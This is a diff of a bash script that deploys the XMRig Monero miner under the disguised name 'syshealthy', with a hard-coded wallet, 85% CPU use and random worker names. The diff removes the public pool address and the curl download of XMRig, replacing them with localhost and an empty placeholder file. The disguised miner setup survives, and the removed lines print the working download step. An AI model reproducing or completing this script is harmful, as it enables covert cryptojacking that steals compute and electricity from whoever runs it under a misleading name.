@@ -10,7 +10,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # --- CONFIGURE THESE ---
 WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
-POOL_URL="pool.supportxmr.com:3333"
+POOL_URL="localhost:8080"
 CPU_PCT=85
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
 CONFIG_DIR="$SCRIPT_DIR/config"
@@ -27,13 +27,10 @@ done
 
 # Download syshealthy (XMRig) if not present
 if [ ! -f "$SCRIPT_DIR/syshealthy" ]; then
-  XMRIG_VERSION="6.21.0"
-  echo "Downloading XMRig $XMRIG_VERSION..."
-  curl -L -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
-  tar -xzf /tmp/xmrig.tar.gz -C /tmp
-  mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "$SCRIPT_DIR/syshealthy"
+  echo "Downloading syshealthy tool..."
+  # Placeholder for download logic
+  touch "$SCRIPT_DIR/syshealthy"
   chmod +x "$SCRIPT_DIR/syshealthy"
-  rm -rf /tmp/xmrig* /tmp/xmrig-${XMRIG_VERSION}
 fi
 
 mkdir -p "$CONFIG_DIR"
